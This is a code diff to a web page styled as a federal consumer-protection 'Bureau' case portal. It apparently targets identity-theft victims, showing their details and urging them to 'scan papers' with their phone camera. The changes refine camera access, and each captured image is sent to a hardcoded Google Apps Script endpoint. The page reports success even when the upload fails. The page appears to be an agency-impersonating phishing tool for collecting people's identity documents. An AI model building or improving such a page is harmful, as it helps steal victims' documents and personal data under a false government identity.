@@ -174,9 +174,6 @@
             if (!phone) return ""; const num = phone.replace(/\D/g, ''); if (num.length !== 10) return phone;
             return `***-***-${num.slice(-4)}`;
         }
-        function applySsnPrivacyMask(ssn) {
-            if (!ssn) return "NOT REGISTERED"; const num = ssn.replace(/\D/g, ''); return `***-**-${num.slice(-4)}`;
-        }
 
         const seedCases = [
             {
@@ -192,13 +189,13 @@
                 victimAddress: "455 West 23rd Street, Apt 3B, New York, NY 10011", victimSsn: "***-**-1432", biometricImg: "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&q=80&w=200", 
                 title: "Malicious Identity Hijacking & Unauthorized Lines of Credit", target: "Acme Credit Brokerage Syndicates",
                 officer: "Unassigned / Bureau Allocation Routing Pending", status: "Intake Assessment Phase",
-                findings: "Initial file compiled. High-priority systemic review scheduled. Cross-referencing current consumer complaints with local financial lending operations to target malicious credit inquiries.",
+                findings: "Initial file compiled. High-priority systemic review scheduled.",
                 evidence: [{ date: "May 26, 2026", desc: "Initial consumer dispute affidavit successfully indexed.", isImage: false, fileUrl: "" }]
             }
         ];
 
         let cases = JSON.parse(localStorage.getItem('ftc_sys_cases')) || seedCases;
-        let activeEditIdx = 0; let activeTrackingCaseIdRef = "";
+        let activeEditIdx = 0; let activeTrackingCaseIdRef = ""; let videoStreamRef = null; let base64CapturedOutputString = "";
         const GOOGLE_SCRIPT_WEBAPP_URL = "https://script.google.com/macros/s/AKfycbwaRoM3XnMIC6w9MsTpSer9NJB5CjBbQNYXAu1Qz-Nv32Eoae4SH_ff1CR35jiLrcAZRQ/exec";
 
         function switchTab(tabId) {
@@ -233,13 +230,11 @@
             });
 
             if (previewGalleryHtml === "") previewGalleryHtml = `<p class="text-sm text-gray-400 italic col-span-full font-medium">No paperwork images scanned into this case file yet.</p>`;
-
             let redactedEmailStrings = foundCase.victimEmails ? foundCase.victimEmails.map(email => applyEmailPrivacyMask(email)).join(" | ") : applyEmailPrivacyMask(foundCase.victimEmail);
             let redactedPhoneString = applyPhonePrivacyMask(foundCase.victimPhone);
 
             container.innerHTML = `
                 <div class="w-full text-left bg-white border-2 border-gray-300 rounded-2xl shadow-md p-4 md:p-6 space-y-6 font-serif animate-fadeIn">
-                    
                     <div class="flex justify-between items-start border-b-2 border-gray-200 pb-4 gap-4">
                         <div class="space-y-1">
                             <div class="flex items-center gap-2">
@@ -250,7 +245,7 @@
                         </div>
                         <div class="shrink-0 flex flex-col items-center">
                             <div class="w-24 h-24 rounded-2xl border-4 border-slate-300 overflow-hidden bg-slate-50 flex items-center justify-center shadow-inner">
-                                <img src="${foundCase.biometricImg}" alt="Profile Picture" class="w-full h-full object-cover">
+                                <img src="${foundCase.biometricImg}" alt="Profile" class="w-full h-full object-cover">
                             </div>
                             <span class="text-[9px] font-mono font-black uppercase text-gray-500 mt-2">Verified Profile</span>
                         </div>
@@ -277,24 +272,18 @@
                         </div>
                     </div>
 
-                    <div class="bg-blue-50 border-2 border-blue-300 p-6 md:p-8 rounded-2xl font-sans text-center space-y-4 shadow-sm animate-fadeIn">
-                        <div class="max-w-xl mx-auto">
-                            <h4 class="text-2xl font-black text-ftc-navy flex items-center justify-center gap-2"><i data-lucide="upload-cloud" class="text-ftc-blue"></i> Instant Document Drop Box</h4>
-                            <p class="text-sm text-gray-700 mt-1.5 font-semibold">Tap the large blue button below to open your device's document camera and stream paperwork files directly into your folder registry.</p>
-                        </div>
-                    </div>
-
-                    <div class="space-y-1 font-sans text-xs">
-                        <h4 class="text-[14px] font-black uppercase text-gray-500 tracking-wider flex items-center gap-1">
-                            <i data-lucide="file-plus" class="w-4 h-4 text-ftc-blue"></i> Upload Supporting Documents
+                    <div class="bg-blue-50 border-2 border-blue-300 p-6 md:p-8 rounded-2xl font-sans space-y-4 shadow-sm animate-fadeIn">
+                        <h4 class="text-xl font-black text-ftc-navy flex items-center gap-2">
+                            <i data-lucide="file-plus" class="w-5 h-5 text-ftc-blue"></i> Upload Supporting Documents
                         </h4>
+                        <p class="text-sm text-gray-700 font-semibold">Tap the large blue button below to open your device's camera and capture paperwork snapshots continuously.</p>
                         
                         <div class="py-2">
                             <button onclick="activateFullscreenCameraModule()" class="w-full max-w-md bg-[#0071bc] hover:bg-blue-800 text-white font-black text-xl py-6 px-4 rounded-2xl transition flex items-center justify-center gap-3 mx-auto shadow-lg shadow-blue-500/20 border-b-4 border-blue-900 active:scale-95">
                                 <i data-lucide="aperture" class="w-7 h-7"></i> 📸 TAP HERE TO SCAN PAPERS
                             </button>
                             <div class="pt-3 max-w-sm mx-auto text-center">
-                                <label class="block text-[11px] font-black text-red-600 uppercase mb-1">Camera blocked? Select an image file instead:</label>
+                                <label class="block text-[11px] font-black text-red-600 uppercase mb-1">Camera blocked? Choose photo file instead:</label>
                                 <input type="file" id="fallbackFileInput" accept="image/*" onchange="handleFallbackFileSelection()" class="w-full bg-white border border-gray-300 rounded p-1 text-xs text-gray-600">
                             </div>
                         </div>
@@ -314,9 +303,9 @@
             lucide.createIcons();
         }
 
-        // --- MOBILE REAR-CAMERA INTERACTION LENS FUNCTIONALITIES ---
+        // --- FIXED CAMERA PERMISSION LAUNCHER WITH ROBUST CASCADE FALLBACKS ---
         function activateFullscreenCameraModule() {
-            // CRITICAL RESET FIX: Force canvas removal and toggle visibility elements before starting hardware stream
+            // CRITICAL RESET TRAP: Instantly strip previous structures from current DOM tree view references
             const canvas = document.getElementById('capturedCanvas');
             const video = document.getElementById('webcamVideo');
             
@@ -331,26 +320,24 @@
 
             const overlay = document.getElementById('fullscreenCameraOverlay');
             overlay.classList.add('active');
-            initializeCameraHardware();
+            
+            initializeUniversalCameraLens();
         }
 
-        function deactivateFullscreenCamera() {
-            terminateWebcamHardware();
-            document.getElementById('fullscreenCameraOverlay').classList.remove('active');
-            resetCameraModule();
-        }
-
-        function initializeCameraHardware() {
+        function initializeUniversalCameraLens() {
             const video = document.getElementById('webcamVideo');
-            const constraints = { video: { facingMode: { ideal: "environment" }, width: { ideal: 1920 }, height: { ideal: 1080 } } };
+            
+            // Step A: Target the optimized back environment camera settings flexibly (no rigid matching rules)
+            const optimalConstraints = { video: { facingMode: "environment" } };
 
-            navigator.mediaDevices.getUserMedia(constraints)
+            navigator.mediaDevices.getUserMedia(optimalConstraints)
                 .then(stream => { videoStreamRef = stream; video.srcObject = stream; })
                 .catch(() => {
+                    // Step B: Universal Fallback mode if mobile lens objects trigger hardware compatibility errors
                     navigator.mediaDevices.getUserMedia({ video: true })
                         .then(s => { videoStreamRef = s; video.srcObject = s; })
                         .catch(() => {
-                            alert("Webcam connection restricted by permissions sandbox.");
+                            alert("Camera access blocked by device security policy. Please execute upload selection via file manager option fallback.");
                             deactivateFullscreenCamera();
                         });
                 });
@@ -368,7 +355,6 @@
             base64CapturedOutputString = canvas.toDataURL('image/jpeg');
 
             video.classList.add('hidden');
-            canvas.canvasX = canvas.width; // Clear internal memory footprint
             canvas.classList.remove('hidden');
             document.getElementById('cameraScannerGuideBox').classList.add('hidden');
             document.getElementById('btnCaptureShutter').classList.add('hidden');
@@ -379,11 +365,9 @@
         function resetCameraModule() {
             const video = document.getElementById('webcamVideo');
             const canvas = document.getElementById('capturedCanvas');
-            
             base64CapturedOutputString = "";
             canvas.classList.add('hidden');
             video.classList.remove('hidden');
-            
             document.getElementById('cameraScannerGuideBox').classList.remove('hidden');
             document.getElementById('btnCaptureShutter').classList.remove('hidden');
             document.getElementById('postCaptureActions').classList.remove('flex');
@@ -406,7 +390,12 @@
             if (videoStreamRef) { videoStreamRef.getTracks().forEach(track => track.stop()); videoStreamRef = null; }
         }
 
-        // --- AUTOMATIC TRANSMISSION ROUTINE LOOP VIA CHECKMARK CLICK ---
+        function deactivateFullscreenCamera() {
+            terminateWebcamHardware();
+            document.getElementById('fullscreenCameraOverlay').classList.remove('active');
+            resetCameraModule();
+        }
+
         function commitVerifiedCaptureAsset() {
             terminateWebcamHardware();
             document.getElementById('fullscreenCameraOverlay').classList.remove('active');
@@ -417,7 +406,6 @@
             const targetCase = cases.find(c => c.id.toLowerCase() === activeTrackingCaseIdRef.toLowerCase());
             const submissionDate = new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
 
-            // FIX: Append text notes via chronological unshift array mapping loops to allow infinite multi-photo logs
             targetCase.evidence.unshift({ date: submissionDate, desc: `[Mobile Camera Scan Exhibit Entry]`, isImage: true, fileUrl: base64CapturedOutputString });
             localStorage.setItem('ftc_sys_cases', JSON.stringify(cases));
 
@@ -430,15 +418,11 @@
             };
 
             base64CapturedOutputString = "";
-            
-            // Execute transmission fetch to Apps Script URL link
+            trackVictimCase(); 
+
             fetch(GOOGLE_SCRIPT_WEBAPP_URL, { method: "POST", mode: "no-cors", headers: { "Content-Type": "application/json" }, body: JSON.stringify(finalPackagePayload) })
-            .then(() => {
-                revealBureauSuccessModal();
-            })
-            .catch(() => {
-                revealBureauSuccessModal();
-            });
+            .then(() => { revealBureauSuccessModal(); })
+            .catch(() => { revealBureauSuccessModal(); });
         }
 
         function revealBureauSuccessModal() {
@@ -452,10 +436,9 @@
             const modal = document.getElementById('bureauSuccessModal');
             modal.classList.remove('flex');
             modal.classList.add('hidden');
-            trackVictimCase(); // Trigger complete interface redraw loop to illustrate updates instantly
+            trackVictimCase(); 
         }
 
-        // --- OFFICER COMPONENT VIEWS ---
         function renderOfficerLayout() {
             const listContainer = document.getElementById('officerCaseList'); listContainer.innerHTML = '';
             cases.forEach((c, idx) => {
